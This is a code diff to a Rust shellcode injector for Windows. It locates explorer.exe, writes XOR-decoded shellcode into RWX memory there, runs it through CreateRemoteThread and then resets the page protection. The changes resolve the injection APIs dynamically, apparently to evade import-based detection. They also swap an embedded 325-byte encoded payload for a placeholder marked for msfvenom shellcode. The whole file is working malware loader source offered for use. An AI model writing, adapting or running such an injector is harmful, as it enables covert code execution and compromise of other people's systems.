@@ -1,21 +1,83 @@
 extern crate winapi;
+
 use std::ptr::null_mut;
-use winapi::um::processthreadsapi::{OpenProcess, CreateRemoteThread, FlushInstructionCache};
-use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory, VirtualProtectEx};
+use winapi::um::processthreadsapi::{OpenProcess};
 use winapi::um::handleapi::CloseHandle;
 use winapi::um::winnt::{HANDLE, MEM_COMMIT, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PROCESS_ALL_ACCESS};
 use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, TH32CS_SNAPPROCESS, PROCESSENTRY32};
 use winapi::shared::minwindef::{DWORD, FALSE};
 use winapi::ctypes::c_void;
-fn xordec(shellcode: &[u8], key: u8) -> Vec<u8> {
+use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
+use winapi::um::synchapi::WaitForSingleObject;
+use std::ffi::CString;
+
+type VirtualAllocExFn = unsafe extern "system" fn(
+    HANDLE,
+    *mut c_void,
+    usize,
+    DWORD,
+    DWORD,
+) -> *mut c_void;
+
+type VirtualProtectExFn = unsafe extern "system" fn(
+    HANDLE,
+    *mut c_void,
+    usize,
+    DWORD,
+    *mut DWORD,
+) -> i32;
+
+type WriteProcessMemoryFn = unsafe extern "system" fn(
+    HANDLE,
+    *mut c_void,
+    *const c_void,
+    usize,
+    *mut usize,
+) -> i32;
+
+type FlushInstructionCacheFn = unsafe extern "system" fn(
+    HANDLE,
+    *const c_void,
+    usize,
+) -> i32;
+
+type CreateRemoteThreadFn = unsafe extern "system" fn(
+    HANDLE,
+    *mut c_void,
+    usize,
+    Option<unsafe extern "system" fn(*mut c_void) -> u32>,
+    *mut c_void,
+    DWORD,
+    *mut DWORD,
+) -> HANDLE;
+
+fn get_func_pnt(module: &str, func: &str) -> *const () {
+    unsafe {
+        let module_cstr = CString::new(module).unwrap();
+        let func_cstr = CString::new(func).unwrap();
+        let module_handle = GetModuleHandleA(module_cstr.as_ptr());
+        if module_handle.is_null() {
+            return null_mut();
+        }
+        let func_ptr = GetProcAddress(module_handle, func_cstr.as_ptr());
+        if func_ptr.is_null() {
+            return null_mut();
+        }
+        func_ptr as *const ()
+    }
+}
+
+fn xor_dec(shellcode: &[u8], key: u8) -> Vec<u8> {
     shellcode.iter().map(|&byte| byte ^ key).collect()
 }
-fn xplr_find() -> Option<DWORD> {
+
+fn find_expl() -> Option<DWORD> {
     unsafe {
         let snapshot: HANDLE = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if snapshot == null_mut() {
             return None;
         }
+
         let mut entry: PROCESSENTRY32 = std::mem::zeroed();
         entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
 
@@ -23,6 +85,7 @@ fn xplr_find() -> Option<DWORD> {
             CloseHandle(snapshot);
             return None;
         }
+
         loop {
             let exe_name = std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr());
             if exe_name.to_str().unwrap().eq_ignore_ascii_case("explorer.exe") {
@@ -34,61 +97,106 @@ fn xplr_find() -> Option<DWORD> {
                 break;
             }
         }
+
         CloseHandle(snapshot);
         None
     }
 }
 
-fn shellinj(pid: DWORD, shellcode: &[u8]) -> Result<(), String> {
+fn inj_shell(pid: DWORD, shellcode: &[u8]) -> Result<(), String> {
     unsafe {
         let process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
         if process == null_mut() {
-            return Err("Handle err.".into());
+            return Err("Handle err".into());
         }
-        let alloc = VirtualAllocEx(process, null_mut(), shellcode.len(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+        let alloc_func_ptr = get_func_pnt("kernel32.dll", "VirtualAllocEx");
+        if alloc_func_ptr.is_null() {
+            CloseHandle(process);
+            return Err("VALXfunc err".into());
+        }
+        let virtual_alloc_ex: VirtualAllocExFn = std::mem::transmute(alloc_func_ptr);
+
+        let protect_func_ptr = get_func_pnt("kernel32.dll", "VirtualProtectEx");
+        if protect_func_ptr.is_null() {
+            CloseHandle(process);
+            return Err("VPEXfunc err".into());
+        }
+        let virtual_protect_ex: VirtualProtectExFn = std::mem::transmute(protect_func_ptr);
+
+        let write_func_ptr = get_func_pnt("kernel32.dll", "WriteProcessMemory");
+        if write_func_ptr.is_null() {
+            CloseHandle(process);
+            return Err("WPMfunc err".into());
+        }
+        let write_process_memory: WriteProcessMemoryFn = std::mem::transmute(write_func_ptr);
+
+        let flush_func_ptr = get_func_pnt("kernel32.dll", "FlushInstructionCache");
+        if flush_func_ptr.is_null() {
+            CloseHandle(process);
+            return Err("FICfunc err".into());
+        }
+        let flush_instruction_cache: FlushInstructionCacheFn = std::mem::transmute(flush_func_ptr);
+
+        let create_thread_func_ptr = get_func_pnt("kernel32.dll", "CreateRemoteThread");
+        if create_thread_func_ptr.is_null() {
+            CloseHandle(process);
+            return Err("CRTfunc err".into());
+        }
+        let create_remote_thread: CreateRemoteThreadFn = std::mem::transmute(create_thread_func_ptr);
+
+        let alloc = virtual_alloc_ex(process, null_mut(), shellcode.len(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
         if alloc == null_mut() {
             CloseHandle(process);
-            return Err("Memalloc err.".into());
+            return Err("Alloc Err".into());
         }
-        if WriteProcessMemory(process, alloc, shellcode.as_ptr() as *const c_void, shellcode.len(), null_mut()) == FALSE {
+
+        if write_process_memory(process, alloc, shellcode.as_ptr() as *const c_void, shellcode.len(), null_mut()) == FALSE {
             CloseHandle(process);
-            return Err("Shell injection err.".into());
+            return Err("Inj Err".into());
         }
-        FlushInstructionCache(process, alloc, shellcode.len());
-        let thread = CreateRemoteThread(process, null_mut(), 0, Some(std::mem::transmute(alloc)), null_mut(), 0, null_mut());
+
+        flush_instruction_cache(process, alloc, shellcode.len());
+
+        let thread = create_remote_thread(process, null_mut(), 0, Some(std::mem::transmute(alloc)), null_mut(), 0, null_mut());
         if thread == null_mut() {
             CloseHandle(process);
-            return Err("Remote thread createion err.".into());
+            return Err("RemThrd err".into());
         }
-        use winapi::um::synchapi::WaitForSingleObject;
+
         let wait_time_ms = 500;
         WaitForSingleObject(thread, wait_time_ms);
-        // Revert memprot
+
+        // gargoyle
         let mut old_protect: DWORD = 0;
-        if VirtualProtectEx(process, alloc, shellcode.len(), PAGE_READWRITE, &mut old_protect) == FALSE {
+        if virtual_protect_ex(process, alloc, shellcode.len(), PAGE_READWRITE, &mut old_protect) == FALSE {
             CloseHandle(thread);
             CloseHandle(process);
-            return Err("Memprot reverse err.".into());
+            return Err("Memprot err".into());
         }
+
         CloseHandle(thread);
         CloseHandle(process);
     }
 
     Ok(())
 }
+
 fn main() {
-    let pid = match xplr_find() {
+    let pid = match find_expl() {
         Some(pid) => pid,
         None => {
             println!("Failed to find explorer.exe process");
             return;
         }
     };
-    //Shellcode Payload
-    let xorenc_shell: [u8; 325] = [0x56, 0xe2, 0x2b, 0x4e, 0x5a, 0x55, 0x55, 0x55, 0x42, 0x7a, 0xaa, 0xaa, 0xaa, 0xeb, 0xfb, 0xeb, 0xfa, 0xf8, 0xfb, 0xfc, 0xe2, 0x9b, 0x78, 0xcf, 0xe2, 0x21, 0xf8, 0xca, 0x94, 0xe2, 0x21, 0xf8, 0xb2, 0x94, 0xe2, 0x21, 0xf8, 0x8a, 0x94, 0xe2, 0x21, 0xd8, 0xfa, 0x94, 0xe2, 0xa5, 0x1d, 0xe0, 0xe0, 0xe7, 0x9b, 0x63, 0xe2, 0x9b, 0x6a, 0x06, 0x96, 0xcb, 0xd6, 0xa8, 0x86, 0x8a, 0xeb, 0x6b, 0x63, 0xa7, 0xeb, 0xab, 0x6b, 0x48, 0x47, 0xf8, 0xeb, 0xfb, 0x94, 0xe2, 0x21, 0xf8, 0x8a, 0x94, 0x21, 0xe8, 0x96, 0xe2, 0xab, 0x7a, 0x94, 0x21, 0x2a, 0x22, 0xaa, 0xaa, 0xaa, 0xe2, 0x2f, 0x6a, 0xde, 0xc5, 0xe2, 0xab, 0x7a, 0xfa, 0x94, 0x21, 0xe2, 0xb2, 0x94, 0xee, 0x21, 0xea, 0x8a, 0xe3, 0xab, 0x7a, 0x49, 0xf6, 0xe2, 0x55, 0x63, 0x94, 0xeb, 0x21, 0x9e, 0x22, 0xe2, 0xab, 0x7c, 0xe7, 0x9b, 0x63, 0xe2, 0x9b, 0x6a, 0x06, 0xeb, 0x6b, 0x63, 0xa7, 0xeb, 0xab, 0x6b, 0x92, 0x4a, 0xdf, 0x5b, 0x94, 0xe6, 0xa9, 0xe6, 0x8e, 0xa2, 0xef, 0x93, 0x7b, 0xdf, 0x7c, 0xf2, 0x94, 0xee, 0x21, 0xea, 0x8e, 0xe3, 0xab, 0x7a, 0xcc, 0x94, 0xeb, 0x21, 0xa6, 0xe2, 0x94, 0xee, 0x21, 0xea, 0xb6, 0xe3, 0xab, 0x7a, 0x94, 0xeb, 0x21, 0xae, 0x22, 0xe2, 0xab, 0x7a, 0xeb, 0xf2, 0xeb, 0xf2, 0xf4, 0xf3, 0xf0, 0xeb, 0xf2, 0xeb, 0xf3, 0xeb, 0xf0, 0xe2, 0x29, 0x46, 0x8a, 0xeb, 0xf8, 0x55, 0x4a, 0xf2, 0xeb, 0xf3, 0xf0, 0x94, 0xe2, 0x21, 0xb8, 0x43, 0xe3, 0x55, 0x55, 0x55, 0xf7, 0x94, 0xe2, 0x27, 0x27, 0x87, 0xab, 0xaa, 0xaa, 0xeb, 0x10, 0xe6, 0xdd, 0x8c, 0xad, 0x55, 0x7f, 0xe3, 0x6d, 0x6b, 0xaa, 0xaa, 0xaa, 0xaa, 0x94, 0xe2, 0x27, 0x3f, 0xa4, 0xab, 0xaa, 0xaa, 0x94, 0xe6, 0x27, 0x2f, 0x88, 0xab, 0xaa, 0xaa, 0xe2, 0x9b, 0x63, 0xeb, 0x10, 0xef, 0x29, 0xfc, 0xad, 0x55, 0x7f, 0xe2, 0x9b, 0x63, 0xeb, 0x10, 0x5a, 0x1f, 0x08, 0xfc, 0x55, 0x7f, 0xed, 0xc3, 0xde, 0xc2, 0xdf, 0xc8, 0x84, 0xc9, 0xc5, 0xc7, 0x85, 0xe8, 0xd8, 0xcf, 0xc4, 0xde, 0xc6, 0xd3, 0xdd, 0xaa, 0xe7, 0xcf, 0xd9, 0xd9, 0xcb, 0xcd, 0xcf, 0xe8, 0xc5, 0xd2, 0xaa, 0xdf, 0xd9, 0xcf, 0xd8, 0x99, 0x98, 0x84, 0xce, 0xc6, 0xc6, 0xaa];
-    let key = 0xaa;
-    let xordec_shell = xordec(&xorenc_shell, key);
-    match shellinj(pid, &xordec_shell) {
+
+    // msfvenom shell goes here vvv
+    let encshell: [u8; 3] = [0xCC, 0xCC, 0xCC];
+    let key = 0xe2;  // Replace this with your actual key
+
+    let decshell = xor_dec(&encshell, key);
+    match inj_shell(pid, &decshell) {
         Ok(_) => println!("Success."),
         Err(e) => println!("Failed: {}", e),
     }
